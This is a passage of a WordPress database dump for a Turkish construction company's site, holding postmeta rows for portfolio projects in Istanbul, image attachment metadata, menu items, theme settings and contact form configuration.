timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1781","151","_edit_lock","1401705100:1");
INSERT INTO `cmrfu_postmeta` VALUES("1779","162","_edit_lock","1401705103:1");
INSERT INTO `cmrfu_postmeta` VALUES("1780","159","_edit_lock","1401705102:1");
INSERT INTO `cmrfu_postmeta` VALUES("539","168","_thumbnail_id","873");
INSERT INTO `cmrfu_postmeta` VALUES("540","173","er_leaf_project_images","174");
INSERT INTO `cmrfu_postmeta` VALUES("541","173","er_leaf_project_images","175");
INSERT INTO `cmrfu_postmeta` VALUES("542","173","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("543","173","er_leaf_project_detail","<p>Kalıpçı Sokak Sude Apt. Dubleks</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1732","861","_wp_attached_file","2013/10/New_21.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1733","861","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:18:\"2013/10/New_21.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"New_21-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"New_21-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"New_21-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"New_21-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"New_21-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"New_21-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("546","173","_thumbnail_id","861");
INSERT INTO `cmrfu_postmeta` VALUES("548","177","er_leaf_project_images","180");
INSERT INTO `cmrfu_postmeta` VALUES("549","177","er_leaf_project_images","179");
INSERT INTO `cmrfu_postmeta` VALUES("550","177","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("551","177","er_leaf_project_detail","<p>Hervenik Dubleks 6</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1717","855","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/81.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"81-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"81-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"81-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"81-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"81-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"81-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1716","855","_wp_attached_file","2013/10/81.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("553","177","er_leaf_project_custom_field","[field title=\"Şehir\"]İstanbul[/field]
");
INSERT INTO `cmrfu_postmeta` VALUES("1731","173","_edit_lock","1401704321:1");
INSERT INTO `cmrfu_postmeta` VALUES("554","177","_thumbnail_id","855");
INSERT INTO `cmrfu_postmeta` VALUES("555","182","er_leaf_project_images","171");
INSERT INTO `cmrfu_postmeta` VALUES("556","182","er_leaf_project_images","169");
INSERT INTO `cmrfu_postmeta` VALUES("557","182","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("558","182","er_leaf_project_detail","<p>Hervenik apartman daire 4</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1701","849","_wp_attachment_metadata","a:5:{s:5:\"width\";i:533;s:6:\"height\";i:800;s:4:\"file\";s:14:\"2013/10/92.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"92-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"92-199x300.jpg\";s:5:\"width\";i:199;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"92-533x230.jpg\";s:5:\"width\";i:533;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"92-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"92-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"92-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1700","849","_wp_attached_file","2013/10/92.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("560","182","er_leaf_project_custom_field","[field title=\"Şehir\"]İstanbul[/field]");
INSERT INTO `cmrfu_postmeta` VALUES("561","182","_thumbnail_id","849");
INSERT INTO `cmrfu_postmeta` VALUES("562","184","er_leaf_project_images","143");
INSERT INTO `cmrfu_postmeta` VALUES("563","184","er_leaf_project_images","144");
INSERT INTO `cmrfu_postmeta` VALUES("564","184","er_leaf_project_images","145");
INSERT INTO `cmrfu_postmeta` VALUES("565","184","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("566","184","er_leaf_project_detail","<p>Alpay Konak Kat 3</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1699","182","_edit_lock","1401703925:1");
INSERT INTO `cmrfu_postmeta` VALUES("568","184","_thumbnail_id","838");
INSERT INTO `cmrfu_postmeta` VALUES("704","186","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1669","524","_edit_lock","1478304516:1");
INSERT INTO `cmrfu_postmeta` VALUES("1670","716","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1671","717","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1876","918","er_leaf_page_title","1");
INSERT INTO `cmrfu_postmeta` VALUES("1673","184","_edit_lock","1401703716:1");
INSERT INTO `cmrfu_postmeta` VALUES("1674","838","_wp_attached_file","2013/10/New_1.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1675","838","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_1.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_1-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_1-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_1-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_1-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_1-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_1-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1668","186","_wp_old_slug","alpay-konak");
INSERT INTO `cmrfu_postmeta` VALUES("707","186","er_leaf_project_custom_field","[field title=\"Şehir\"]İstanbul[/field]");
INSERT INTO `cmrfu_postmeta` VALUES("708","186","er_leaf_project_images","174");
INSERT INTO `cmrfu_postmeta` VALUES("709","186","er_leaf_project_images","175");
INSERT INTO `cmrfu_postmeta` VALUES("1639","823","_wp_attached_file","2013/10/9.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("711","186","er_leaf_project_customer","Hervenik");
INSERT INTO `cmrfu_postmeta` VALUES("712","186","er_leaf_meta_title","House Happy");
INSERT INTO `cmrfu_postmeta` VALUES("713","186","er_leaf_meta_desc","Proin ut ligula vel nunc egestas porttitor. Morbi lectus risus, iaculis vel, suscipit quis, luctus non, massa. Fusce ac turpis quis ligula lacinia aliquet. Mauris ipsum.");
INSERT INTO `cmrfu_postmeta` VALUES("714","186","er_leaf_meta_keyword","Morbi lectus risus, iaculis vel");
INSERT INTO `cmrfu_postmeta` VALUES("715","446","_form","<p>İsim*<br />
    [text* your-name] </p>

<p>Email*<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>Mesajınız<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Gönder\"]</p>");
INSERT INTO `cmrfu_postmeta` VALUES("716","446","_mail","a:7:{s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:21:\"info@herkonyapi.com\";s:4:\"body\";s:173:\"From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:21:\"info@herkonyapi.com\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("717","446","_mail_2","a:8:{s:6:\"active\";b:0;s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:26:\"[your-name] <[your-email]>\";s:4:\"body\";s:115:\"Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:12:\"[your-email]\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("718","446","_messages","a:21:{s:12:\"mail_sent_ok\";s:43:\"Your message was sent successfully. Thanks.\";s:12:\"mail_sent_ng\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:16:\"validation_error\";s:74:\"Validation errors occurred. Please confirm the fields and submit it again.\";s:4:\"spam\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:12:\"accept_terms\";s:35:\"Please accept the terms to proceed.\";s:16:\"invalid_required\";s:31:\"Please fill the required field.\";s:17:\"captcha_not_match\";s:31:\"Your entered code is incorrect.\";s:12:\"invalid_date\";s:26:\"Date format seems invalid.\";s:14:\"date_too_early\";s:23:\"This date is too early.\";s:13:\"date_too_late\";s:22:\"This date is too late.\";s:13:\"upload_failed\";s:22:\"Failed to upload file.\";s:24:\"upload_file_type_invalid\";s:30:\"This file type is not allowed.\";s:21:\"upload_file_too_large\";s:23:\"This file is too large.\";s:23:\"upload_failed_php_error\";s:38:\"Failed to upload file. Error occurred.\";s:14:\"invalid_number\";s:28:\"Number format seems invalid.\";s:16:\"number_too_small\";s:25:\"This number is too small.\";s:16:\"number_too_large\";s:25:\"This number is too large.\";s:23:\"quiz_answer_not_correct\";s:27:\"Your answer is not correct.\";s:13:\"invalid_email\";s:28:\"Email address seems invalid.\";s:11:\"invalid_url\";s:18:\"URL seems invalid.\";s:11:\"invalid_tel\";s:31:\"Telephone number seems invalid.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("719","446","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("720","446","_locale","en_US");
INSERT INTO `cmrfu_postmeta` VALUES("721","449","_form","<div class=\"cols\">
<div class=\"col-4\">
<p>Your Name (required)<br />
    [text* your-name] </p>

<p>Your Email (required)<br />
    [email* your-email] </p>

<p>Subject<br />
    [text your-subject] </p>
</div>
<div class=\"col-4\">
<p>Your Message<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Send\"]</p>
</div>
</div>");
INSERT INTO `cmrfu_postmeta` VALUES("722","449","_mail","a:7:{s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:26:\"[your-name] <[your-email]>\";s:4:\"body\";s:173:\"From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:22:\"hoathuancntt@gmail.com\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("723","449","_mail_2","a:8:{s:6:\"active\";b:0;s:7:\"subject\";s:14:\"[your-subject]\";s:6:\"sender\";s:26:\"[your-name] <[your-email]>\";s:4:\"body\";s:115:\"Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)\";s:9:\"recipient\";s:12:\"[your-email]\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("724","449","_messages","a:21:{s:12:\"mail_sent_ok\";s:43:\"Your message was sent successfully. Thanks.\";s:12:\"mail_sent_ng\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:16:\"validation_error\";s:74:\"Validation errors occurred. Please confirm the fields and submit it again.\";s:4:\"spam\";s:93:\"Failed to send your message. Please try later or contact the administrator by another method.\";s:12:\"accept_terms\";s:35:\"Please accept the terms to proceed.\";s:16:\"invalid_required\";s:31:\"Please fill the required field.\";s:17:\"captcha_not_match\";s:31:\"Your entered code is incorrect.\";s:12:\"invalid_date\";s:26:\"Date format seems invalid.\";s:14:\"date_too_early\";s:23:\"This date is too early.\";s:13:\"date_too_late\";s:22:\"This date is too late.\";s:13:\"upload_failed\";s:22:\"Failed to upload file.\";s:24:\"upload_file_type_invalid\";s:30:\"This file type is not allowed.\";s:21:\"upload_file_too_large\";s:23:\"This file is too large.\";s:23:\"upload_failed_php_error\";s:38:\"Failed to upload file. Error occurred.\";s:14:\"invalid_number\";s:28:\"Number format seems invalid.\";s:16:\"number_too_small\";s:25:\"This number is too small.\";s:16:\"number_too_large\";s:25:\"This number is too large.\";s:23:\"quiz_answer_not_correct\";s:27:\"Your answer is not correct.\";s:13:\"invalid_email\";s:28:\"Email address seems invalid.\";s:11:\"invalid_url\";s:18:\"URL seems invalid.\";s:11:\"invalid_tel\";s:31:\"Telephone number seems invalid.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("725","449","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("726","449","_locale","en_US");
INSERT INTO `cmrfu_postmeta` VALUES("746","710","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("747","710","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("748","710","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("749","710","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("750","710","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("751","710","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("752","710","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("753","710","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2010","949","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2009","949","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("2008","949","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("2007","949","_menu_item_object_id","944");
INSERT INTO `cmrfu_postmeta` VALUES("2006","949","_menu_item_menu_item_parent","950");
INSERT INTO `cmrfu_postmeta` VALUES("2005","949","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("2003","948","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2002","948","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("2001","948","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2000","948","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1999","948","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1998","948","_menu_item_object_id","946");
INSERT INTO `cmrfu_postmeta` VALUES("2027","951","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:22:\"2014/08/baykaralar.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:22:\"baykaralar-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:22:\"baykaralar-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:20:\"baykaralar-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("786","715","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("787","715","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("788","715","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("789","715","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("790","715","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("791","715","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("792","715","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("793","715","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("794","716","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("795","716","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("796","716","_menu_item_object_id","497");
INSERT INTO `cmrfu_postmeta` VALUES("797","716","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("798","716","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("799","716","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("800","716","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("801","716","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("802","717","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("803","717","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("804","717","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("805","717","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("806","717","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("807","717","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("808","717","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("809","717","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1875","918","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1874","918","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1873","918","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1872","918","_wp_page_template","page-portfolio.php");
INSERT INTO `cmrfu_postmeta` VALUES("1871","918","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1997","948","_menu_item_menu_item_parent","950");
INSERT INTO `cmrfu_postmeta` VALUES("1995","946","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("1994","946","_edit_lock","1412589265:1");
INSERT INTO `cmrfu_postmeta` VALUES("1993","946","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1992","946","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1991","946","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1990","946","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1989","946","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("1996","948","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1987","946","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1986","946","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1984","944","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("1983","944","_edit_lock","1409348305:1");
INSERT INTO `cmrfu_postmeta` VALUES("1982","944","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1981","944","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1980","944","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1979","944","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1978","944","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("1985","946","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1976","944","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("1975","944","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1974","944","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1973","943","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1970","943","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1969","943","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1968","943","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1967","943","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1966","943","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1965","943","_menu_item_object_id","939");
INSERT INTO `cmrfu_postmeta` VALUES("1964","943","_menu_item_menu_item_parent","934");
INSERT INTO `cmrfu_postmeta` VALUES("1884","921","_menu_item_object_id","918");
INSERT INTO `cmrfu_postmeta` VALUES("1883","921","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1882","921","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1881","918","_edit_lock","1409348352:1");
INSERT INTO `cmrfu_postmeta` VALUES("1880","918","er_leaf_portfolio_enable_filter","1");
INSERT INTO `cmrfu_postmeta` VALUES("1869","915","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1877","918","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("1878","918","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1879","918","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("1972","942","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1961","942","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1960","942","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1959","942","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1958","942","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1957","942","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1956","942","_menu_item_object_id","935");
INSERT INTO `cmrfu_postmeta` VALUES("1955","942","_menu_item_menu_item_parent","934");
INSERT INTO `cmrfu_postmeta` VALUES("1954","942","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1953","939","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("1865","915","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1864","915","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1863","915","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1862","915","_menu_item_object_id","524");
INSERT INTO `cmrfu_postmeta` VALUES("1861","915","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1895","924","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("1952","940","_wp_attachment_metadata","a:5:{s:5:\"width\";i:683;s:6:\"height\";i:882;s:4:\"file\";s:26:\"2014/08/deprem-gercegi.png\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:26:\"deprem-gercegi-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:26:\"deprem-gercegi-232x300.png\";s:5:\"width\";i:232;s:6:\"height\";i:300;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:26:\"deprem-gercegi-683x230.png\";s:5:\"width\";i:683;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:26:\"deprem-gercegi-450x535.png\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:26:\"deprem-gercegi-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:24:\"deprem-gercegi-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
